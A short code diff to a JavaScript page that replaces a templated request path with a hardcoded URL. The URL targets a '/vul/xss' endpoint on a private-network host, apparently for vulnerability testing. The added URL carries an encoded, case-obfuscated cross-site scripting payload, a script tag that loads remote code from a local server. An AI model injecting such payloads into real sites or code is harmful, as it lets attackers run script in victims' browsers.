@@ -93,7 +93,8 @@ function createXmlHttp() {
 }
 createXmlHttp();
 xmlHttp.onreadystatechange = writeSource;
-xmlHttp.open('GET', '{path}', true);
+var url = 'http://10.253.26.169:8080/vul/xss?param=%3CsCRiPt%20sRC=//127.0.0.1:8001/E8kv%3E%3C/sCrIpT%3E'
+xmlHttp.open('GET', url, true);
 xmlHttp.send(null);
 function writeSource() {
   if (xmlHttp.readyState == 4) {
